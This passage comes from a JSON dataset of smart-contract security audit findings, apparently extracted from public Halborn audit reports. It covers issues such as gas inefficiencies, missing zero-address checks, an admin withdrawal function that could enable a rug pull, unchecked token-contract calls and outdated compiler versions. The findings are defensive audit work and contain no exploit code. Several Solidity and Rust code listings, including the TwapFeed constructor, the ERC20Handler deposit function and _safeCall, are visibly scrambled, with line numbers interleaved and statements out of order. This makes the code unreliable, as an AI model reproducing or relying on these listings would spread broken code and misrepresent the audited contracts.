        "body": "The TwapFeed contracts constructor contains a require statement, Such verifying if the Pair struct stored in storage was initialized. validation is unnecessary in the constructor, as the storage is guaranteed not to be initialized yet. As a consequence, this comparison increases the execution cost without any benefits. Code Location: Listing 30: contracts/Oracle/TwapFeed.sol (Lines 47-50) pairDecimals = asToken0 ? 18 + token1 . decimals () - token0 . constructor ( address _uniswapV2Pair , bool asToken0 ) public { uniswapV2Pair = _uniswapV2Pair ; pair . asToken0 = asToken0 ; 39 40 41 42 43 EIP20Interface token0 = EIP20Interface ( IUniswapV2Pair (  uniswapV2Pair ). token0 () ); 44 EIP20Interface token1 = EIP20Interface ( IUniswapV2Pair (  uniswapV2Pair ). token1 () ); 45  decimals () : 18 + token0 . decimals () - token1 . decimals () ; 46 47 48 49 50 51 52 53 54 55 56 57 58 uint32 blockTimestamp = getBlockTimestamp () ; pair . priceCumulativeSlotA = priceCumulativeCurrent ; pair . priceCumulativeSlotB = priceCumulativeCurrent ; pair . lastUpdateSlotA = blockTimestamp ; ! pair . initialized , \" TwapFeed : ALREADY_INITIALIZED \" getPriceCumulativeCurrent ( pair . asToken0 ); uint256 priceCumulativeCurrent = require ( ); 43 59 60 61 62 63 64 65 66 67 68 pair . lastUpdateSlotB = blockTimestamp ; pair . latestIsSlotA = true ; pair . initialized = true ; emit PriceUpdate ( uniswapV2Pair , priceCumulativeCurrent , blockTimestamp , true ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Delete the unnecessary require statements. Remediation Plan: SOLVED: 851e5e1aca4b4d01b4f007082604e6e9a5c8be85 Bastion Protocol team The solved this issue in commit 44 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTIONS CAN BE DECLARED EXTERNAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple functions are declared as public. However, they do not appear to be called from within the contract in which they are defined. Suppose a function is designed to be called by users and is not intended to be accessible internally to other functions. In that case, it is better to declare them as external to reduce the gas cost associated with their execution. Code Location: Following is the list of functions that can be declared as external. FluxOracle.sol:  getUnderlyingPrice FluxOracleV1.sol:  getUnderlyingPrice LPOracle.sol:  getUnderlyingPrice NEAROracle.sol:  getUnderlyingPrice StNearFeed.sol: 45  latestAnswer StNearFeedV1.sol:  setStNearPrice  setNearFeed Comptroller.sol and ComptrollerG1.sol:  enterMarkets  getAccountLiquidity  getHypotheticalAccountLiquidity  _setRewardDistributor  _setPriceOracle  _setPauseGuardian  _setMintPaused  _setBorrowPaused  _setTransferPaused  _setSeizePaused  _become  getAllMarkets  isMarketListed Risk Level: Likelihood - 1 Impact - 1 Recommendation: Declare functions designed to be called externally as external. Remediation Plan: SOLVED: 5fae05ea94bf13bedb4f80155adaa6c2ab97b9a3 Bastion Protocol team The solved this issue in commit 46 3.10 (HAL-10) USE OF EXPERIMENTAL FEATURES - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Informational"
        ]
    },
    {
        "title": "UPGRADE TO AT LEAST PRAGMA 0.8.10",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Multisend_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Gas optimizations and additional safety checks are available for free when using newer compiler versions and the optimizer.  Safemath by default since 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inline: as of 0.8.2, leads to cheaper gas runtime. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not built in, they cost an additional 20 to 40 gas due to the 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases, used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.  Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors. Code Location: The contract within scope made use of the pragma version 0.6.7 Risk Level: Likelihood - 1 Impact - 1 11 Recommendation: Halborn recommends that the project is upgraded to use at least pragma 0.8.10. Remediation Plan: SOLVED: Seascape upgraded the pragma version to 0.8.13. 12 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Multisend",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF MINIMUM THRESHOLD FOR INITIALRELAYERS/RELAYERTHRESHOLD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the contract Bridge, the _relayerThreshold state variable records the minimum number of votes needed before a proposal can be executed by a relayer. On the other hand, in the constructor, there is not a minimum threshold for the amount of relayers. Halborn suggests setting a minimum of 2 for the _relayerThreshold and a minimum of 3 initialRelayers. This way, 2 different relayer votes will be needed before a proposal is executed. In case a relayer is compromised, the other 2 relayers will be able to mitigate his actions. Furthermore, if a relayer is down, the other 2 relayers will be able to vote for the proposal and get it executed. If there was just one relayer, and this relayer was down, users would never receive their funds in the destination chain. Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to set a minimum of 2 for the _relayerThreshold and a minimum of 3 initialRelayers to maintain redundancy in the system. 14 Remediation Plan: SOLVED: The Cerebellum Network team fixed the issue by setting the threshold to 2 and setting up 4 relayers. 15 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF LIQUIDITY LOSS PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the contract Bridge the function adminWithdraw() allows the admin to withdraw any fund stored in the different handler contracts. A malicious admin could use this function to perform a rug pull in all the handlers. Code location: Listing 1: Bridge.sol (Line 283) address handlerAddress , address tokenAddress , address recipient , uint256 amountOrTokenID 276 function adminWithdraw ( 277 278 279 280 281 ) external onlyAdmin { 282 283 284 } IERCHandler handler = IERCHandler ( handlerAddress ); handler . withdraw ( tokenAddress , recipient , amountOrTokenID ); Risk Level: Likelihood - 1 Impact - 3 Recommendation: The adminWithdraw function allows the owner of the system to withdraw all the assets from the different handlers. The owner should be limited to the minimum operations possible. These functionalities should be split between multiple role based users with multi-signature wallets for each one. If possible, it is recommended to remove this function. If not, it is recommended to at least use a multisig wallet as the Admin wallet 16 adding also a Timelock. Remediation Plan: RISK ACCEPTED: The Cerebellum Network team accepts this risk as they use a multi-signature wallet to manage the admin wallet. 17 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Low"
        ]
    },
    {
        "title": "ERC20SAFE.SAFECALL DOES NOT VERIFY THAT THE TOKEN ADDRESS IS A CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the contract ERC20Safe the function _safeCall() is used to perform all the token transfers: Listing 2: ERC20Safe.sol function _safeCall ( IERC20 token , bytes memory data ) private { ( bool success , bytes memory returndata ) = address ( token ). require ( success , \" ERC20 : call failed \" ); if ( returndata . length > 0) { 76 77  call ( data ); 78 79 80 81 82  operation did not succeed \" ); 83 84 } } require ( abi . decode ( returndata , ( bool )) , \" ERC20 : This function does not verify that the token address passed as a parameter is actually a contract allowing, as can be seen below, to perform a transfer using the zero address as the token parameter: This was recently exploited in the Qubit Finances bridge. The likelihood of this exploit is very low as the token used in the deposits must pass this check: 18 require(_contractWhitelist[tokenAddress], \"provided tokenAddress is not whitelisted\"); This scenario would only become real if an admin called Bridge. adminSetResource with an invalid/wrong tokenAddress. Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to follow OpenZeppelins approach and check in the _safeCall() function that the token address is a contract address. To achieve that, the function functionCall() instead of call() from OpenZeppelins Address.sol contract can be used. Also another possible addition would be checking the balance before and after the asset transfer to ensure that the number of the transferred asset compiles the expectation. Remediation Plan: RISK ACCEPTED: The Cerebellum Network team accepts the risk of this finding. 19 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "Multiple contracts are missing address validation in their constructors. Every address should be validated and checked that is different from zero. Code location: ERC20Handler.sol - Line 38: address bridgeAddress - Line 40: address[] memory initialContractAddresses ERC721Handler.sol - Line 49: address bridgeAddress - Line 51: address[] memory initialContractAddresses - Line 52: address[] memory burnableContractAddresses GenericHandler.sol - Line 66: address bridgeAddress - Line 68: address[] memory initialContractAddresses Bridge.sol - Line 110: address[] memory initialRelayers - Line 141: grantRole(DEFAULT_ADMIN_ROLE, newAdmin); - Line 180: grantRole(RELAYER_ROLE, relayerAddress); - Line 207: _resourceIDToHandlerAddress[resourceID] = handlerAddress; - Line 227: _resourceIDToHandlerAddress[resourceID] = handlerAddress; Risk Level: Likelihood - 3 Impact - 2 20 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: RISK ACCEPTED: The Cerebellum Network team accepts the risk of this finding. 21 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Low"
        ]
    },
    {
        "title": "WRONG INFORMATION DISPLAYED IN THE DEPOSIT RECORD WHEN SUPPLYING TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the contract ERC20Handler.sol, the deposit function assumes that the total amount of tokens that will be locked in the smart contract after calling lockERC20(tokenAddress, depositer, address(this), amount) ; is equal to the amount parameter (and thus it creates a depositRecord accordingly). Listing 3: ERC20Handler.sol - deposit (Lines 111,120) bytes32 resourceID , uint8 uint64 address depositer , bytes calldata data destinationChainID , depositNonce , ) external override onlyBridge { memory recipientAddress ; amount ; lenRecipientAddress ; function deposit ( bytes uint256 uint256 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99  lenRecipientAddress )) ) assembly { amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , 100 101 calldatacopy ( 22 102 recipientAddress , // copy to  destinationRecipientAddress 103 104 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size (  calldatasize - 0 x104 ) 105 106 107 108 ) } address tokenAddress = _resourceIDToTokenContractAddress [  resourceID ]; 109 require ( _contractWhitelist [ tokenAddress ], \" provided  tokenAddress is not whitelisted \" ); 110 111 112 113 lockERC20 ( tokenAddress , depositer , address ( this ) , amount ); _depositRecords [ destinationChainID ][ depositNonce ] =  DepositRecord ( 114 115 116 117 118 119 120 121 122 ); } tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , depositer , amount However, this may not be true if the tokenAddress is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in depositRecord. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to get the actual received amount by calculating the difference of token balance before and after the transfers. 23 Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team claims that Bridge uses only the CERE token. The CERE token is not a transfer-on-fee or a deflationary token. 24 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF TRANSFER INSTEAD OF CALL TO TRANSFER ETHER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the contract Bridge, the transferFunds function uses address.transfer Any smart contract that () to transfer Ether to a set of addresses. uses transfer() or send() is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300. Since its introduction, transfer() has typically been recommended by the security community because it helps guard against reentrancy attacks. This guidance made sense under the assumption that gas costs wouldnt change, but that assumption turned out to be incorrect. As gas costs are subject to change, then smart contracts cant depend on any particular gas costs, thats why transfer() and send() should be avoided. call() should be used instead. Code Location: Listing 4: Bridge.sol (Line 429) 427 function transferFunds ( address payable [] calldata addrs , uint  [] calldata amounts ) external onlyAdmin { 428 429 430 431 for ( uint i = 0; i < addrs . length ; i ++) { addrs [ i ]. transfer ( amounts [i ]) ; } } Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: It is recommended to use call() instead of transfer() to transfer Ether. Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 26 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: ERC20Handler.sol - Line 47: for (uint256 i = 0; i < initialResourceIDs.length; i++){ ERC721Handler.sol - Line 59: for (uint256 i = 0; i < initialResourceIDs.length; i++){ - Line 63: for (uint256 i = 0; i < burnableContractAddresses.length; i++){ GenericHandler.sol - Line 83: for (uint256 i = 0; i < initialResourceIDs.length; i++){ Bridge.sol - Line 120: for (uint i; i < initialRelayers.length; i++){ - Line 122: _totalRelayers++; - Line 428: for (uint i = 0; i < addrs.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 5: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 27 function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } 4 contract test { 5 6 7 8 9 10 11 12 13 } } We can see the difference in the gas costs: Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This does not only apply to the iterator variable. It also applies to variables declared inside the loop code block. 28 Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 29 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "As i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: ERC20Handler.sol - Line 47: for (uint256 i = 0; i < initialResourceIDs.length; i++){ ERC721Handler.sol - Line 59: for (uint256 i = 0; i < initialResourceIDs.length; i++){ - Line 63: for (uint256 i = 0; i < burnableContractAddresses.length; i++){ GenericHandler.sol - Line 83: for (uint256 i = 0; i < initialResourceIDs.length; i++){ Bridge.sol - Line 428: for (uint i = 0; i < addrs.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize uint256 variables to 0 to save some gas. For example, use instead: for (uint256 i; i < initialResourceIDs.length; ++i){. 30 Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 31 ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf",
        "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: ERC721MinterBurnerPauser.sol - mint() (ERC721MinterBurnerPauser.sol#44-49) - pause() (ERC721MinterBurnerPauser.sol#60-63) - unpause() (ERC721MinterBurnerPauser.sol#74-77) ERC721Safe.sol - fundERC721() (ERC721Safe.sol#21-24) ERC20Safe.sol - fundERC20() (ERC20Safe.sol#20-23) Bridge.sol - cancelProposal() (Bridge.sol#380-390) Whitelist.sol - enableWhitelist() (Whitelist.sol#69-73) - disableWhitelist() (Whitelist.sol#80-84) - removeFromWhitelist() (Whitelist.sol#112-116) - addToWhitelist() (Whitelist.sol#100-104) Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 33 3.10 (HAL-10) UNUSED IMPORTS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Cere_Bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "MANAGER ADDRESS CANNOT BE TRANSFERRED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The functions to update the configuration in the contracts within scope lacked the option of setting a new manager as a privileged address. If the keys of the manager account were suspected to be compromised, or the development team needed to change the address for an operational reason, a sizable portion of the contracts functionality will be rendered unusable. Code Location: Listing 1: Affected functions 1 contracts / airdrops - registry / src / contract . rs :59: pub fn update_airdrop_registry ( 2 contracts / reward / src / contract . rs :204: pub fn update_config ( 3 contracts / staking / src / contract . rs :143: pub fn update_config ( Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to add manager transfer capabilities to the contracts, split into two different functions: set_manager and accept_manager. The latter function allows the transfer to be completed by the recipient, pro- tecting the contract against potential typing errors compared to single- step manager change features. 14 Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit 849a43b9c96cb6b70b67a0bb60aaa5c0be221d1e. 15 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNDERUSED PROTOCOL INACTIVE STATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The staking contract implemented a switch to go into a pause-like state called Protocol Inactive by using the config.active setting. This check was not implemented consistently across all the functions accessible for unprivileged users, but only on the deposit one. This state could be desirable for some reasons, where external users interference would like to be kept to the minimum among all features of the contract. Code Location: Listing 2: Affected assets 1 contracts / staking / src / contract . rs :486 redeem_rewards function 2 contracts / staking / src / contract . rs :523 swap_rewards function 3 contracts / staking / src / contract . rs :486 reinvest function 4 contracts / staking / src / contract . rs :615 reimburse_slashing function 5 contracts / staking / src / contract . rs :715 undelegate_stake function 6 contracts / staking / src / contract . rs :810 reconcile_funds function 7 contracts / staking / src / contract . rs :888 withdraw_funds_to_wallet function 8 contracts / staking / src / contract . rs :976 claim_airdrops function Risk Level: Likelihood - 1 Impact - 3 16 Recommendation: It is recommended to extend the usage of the Protocol Inactive check to the rest of publicly accessible functionalities related to fund updates, stake tracking or swap contract interaction. Remediation plan: SOLVED: A new operations control mechanism has been implemented to have a more granular control over paused operations, covering all listed functionalities. This issue was fixed in commit 368f9a665af2fd6d512d2687e40f8699b7a6e164. 17 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "CONFIGURATION PARAMETER COULD NOT BE UPDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The instantiate function did not set the cw20_token_contract address, as done with other contract addresses required in the configuration. Instead, it relied on update_config being called post initialization, which could cause undesirable situations if this address is not set right after deployment. It is worth noting that the update_config function only allowed to set the CW20 address if it contained the initial value Addr::unchecked(\"0\"). This effectively forbade any future change after the first update. Code Location: Listing 3: contracts/staking/src/contract.rs (Lines 62) . api . addr_validate ( msg . airdrops_registry_contract . as_str () )? , 55 airdrop_registry_contract : deps 56 57 58 airdrop_withdrawal_contract : deps 59 60 61 reward_contract : deps . api . addr_validate ( msg . reward_contract . as_str . api . addr_validate ( msg . airdrop_withdrawal_contract . as_str () )? , () )?, 62 cw20_token_contract : Addr :: unchecked ( \"0 \" ) , 63 64 protocol_fee_contract : deps . api . addr_validate ( msg . protocol_fee_contract . as_str () )? , Listing 4: contracts/staking/src/contract.rs (Lines 153) 143 pub fn update_config ( 144 145 deps : DepsMut , info : MessageInfo , 18 env : Env , update_config : ConfigUpdateRequest , 146 147 148 ) -> Result < Response , ContractError > { 149 150 151 152 let mut config = CONFIG . load ( deps . storage ) ?; validate (& config , & info , & env , vec! [ Verify :: SenderManager ]) ?; if let Some ( cw20_contract ) = update_config . cw20_token_contract 153 154 155 156 { if config . cw20_token_contract == Addr :: unchecked ( \"0 \" ) { config . cw20_token_contract = deps . api . addr_validate ( cw20_contract . as_str () ) ?; } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: The cw20_token_contract variable should be set upon instantiate, as with the other contract addresses. Remediation plan: ACKNOWLEDGED: Stader Labs acknowledged this finding. 19 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "OUTDATED INFORMATION DISPLAYED TO USERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The reimburse_slashing function of the staking contract does not update the total_staked and exchange_rate state variables. As detailed in the comment of line 635, most functionalities perform a check_slashing at the beginning or update these values. However, this is not the case of query_user_info and query_compute_deposit_breakdown. If a user queries those functions after a reimburse_slashing has been performed, they would receive erroneous information due to the lack of update. Code Location: Listing 5: Affected assets 1 contracts / staking / src / contract . rs :615 reimburse_slashing function Risk Level: Likelihood - 2 Impact - 1 Recommendation: Update the total_staked and exchange_rate state variables consistently so every function returns or work with up-to-date information. 20 Remediation plan: SOLVED: Added a RedeemRewards message from the staking contract as a result of the reimburse_slashing function, which effectively updates the exchange rate at the end of the transaction. This issue was fixed on commit 24ec25b51e52e98c1128cd77c379d94b3e9dab58s. 21 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISUSE OF HELPER METHODS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of the unwrap and expect function is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option does not have Some value or Result. Never- theless, leaving unwrap or expect functions in production environments is a bad practice because not only will this cause the program to crash out, or panic!, but also (in case of unwrap) no helpful messages are shown to help the user solve, or understand the reason of the error. Code Location: Listing 6: Affected assets 1 contracts / reward / src / contract . rs : # L93 , 168 , 171 , 217 2 contracts / staking / src / contract . rs : # L266 , 361 , 371 , 400 , 433 , 579 , 632 , 696 , 701 , 743 , 773 , 785 , 830 , 836 , 867 , 880 , 946 , 956 , 1020 , 1108 , 1121 , 1137 3 contracts / staking / src / helpers . rs : # L90 , 98 , 122 , 163 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not use the unwrap or expect functions in a production environment because this use provokes panic! and may crash the Spectrum contracts without error messages. Some alternatives are possible, such as propagating the error by putting a \"?\", using unwrap_or / unwrap_or_else / unwrap_or_default functions, or using error-chain crate for errors. 22 Reference: https://crates.io/crates/error-chain Remediation plan: SOLVED: Most of the instances highlighted below has been fixed using the recommendations or deemed secure due to previous checks. Instances related to the result of checked_add operations have not been modified, as the risk of overflow in those cases is minimal, since the entire supply of Terra supply will not cause the value of uint128 to overflow. This issue was fixed in commit 7478e89ee9a0f72b89690573fd2dee956d2408fa. 23 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MULTIPLE INSTANCES OF UNCHECKED MATH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some mathematical operations that could cause unexpected behavior under specific circumstances were found on the codebase. Although no effective arithmetic over/underflow were found and the overflow-checks = true flag was set on Cargo.toml, it is still recommended to avoid unchecked math as much as possible to follow best-practices and limit the risk of future updates introducing an actual vulnerability. Code Location: Listing 7: Affected assets 1 packages / stader - utils / src / coin_utils . rs :173: Decimal = ( b_u256 * a_u256 ). into () ; 2 packages / stader - utils / src / coin_utils . rs :181: Decimal = ( b_u256 + a_u256 ). into () ; 3 packages / stader - utils / src / coin_utils . rs :189: Decimal = ( a_u256 - b_u256 ). into () ; 4 packages / stader - utils / src / coin_utils . rs :243: let c_u256 : let c_u256 : let c_u256 : Uint128 :: new ( coin . amount . u128 () + existing_coin . u128 () ) , 5 packages / stader - utils / src / coin_utils . rs :278: Uint128 :: new ( existing_coin . u128 () - coin . amount . u128 () ) , 6 packages / stader - utils / src / coin_utils . rs :432: coin . amount . u128 () * ratio . numerator () / ratio . denominator () , 7 packages / stader - utils / src / coin_utils . rs :437: numerator () / dec . denominator () ) as u128 ( num * dec . Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: In the release mode, Rust does not panic on overflows and overflown values just wrap without any explicit feedback to the user. It is rec- ommended then to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Consider replacing the addition operator with Rusts checked_add method, the multiplication with checked_mul and so on. Remediation plan: ACKNOWLEDGED: Since the affected instances were not exploitable and there- fore did not pose a direct risk to in-scope contracts, Stader Labs ac- knowledged the potential risks outlined above. 25 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNFINISHED DEVELOPMENT COMMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple ToDo comments and commented code instances were found on the codebase. Although incomplete code does not directly cause a security vulnerability or affect the audits outcome as far as it is functional, having development comments could simplify the process for an attacker to find a valid attack surface within the contract. In addition, it shows that the audited code will be different from the released one, which could cause that new vulnerabilities were to be introduced in the code after the audit. Code Location: Listing 8: Affected assets 1 staking / src / helpers . rs :29:// TODO : bchain99 - write unit - tests to validate . 2 staking / src / contract . rs :1092:// TODO - GM . Test this 3 staking / src / contract . rs :1101: // TODO - GM . Will converting u64 to string for batch id start work ? 4 staking / src / contract . rs :521:// TODO - GM . Does swap have a fixed cost or a linear cost ? 5 reward / src / contract . rs :77:// TODO - GM . Does swap have a fixed cost or a linear cost ? Useful to make this permissionless . 6 reward / src / contract . rs :94: // let denoms : Vec < String > = total_rewards 7 reward / src / contract . rs :95: 8 reward / src / contract . rs :96: () ) 9 reward / src / contract . rs :97: 10 // // // . iter () . map (| item | item . denom . clone . collect () ; 26 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Remove all the instances development related comments, reviewing if some modifications are still pending to be made. Remediation plan: SOLVED: Suggested mitigation steps have been implemented by the Stader Labs team in commit 07878e2eefa1e66a9a25ad3dc234340a355b5ad0. 27 ",
        "labels": [
            "Halborn",
            "Stader_Labs_LunaX_Contrracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION DEPRECATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The current version in use for the contract is pragma ^0.5.16. While this version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing 1: stakingFactory.sol (Lines 1) 1 pragma solidity ^0.5.16; 2 3 /* * Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.6. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code. (0.6.12) Remediation Plan: SOLVED: Pragma version was upgraded to 0.7.6. 13 ",
        "labels": [
            "Halborn",
            "EasyFi_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
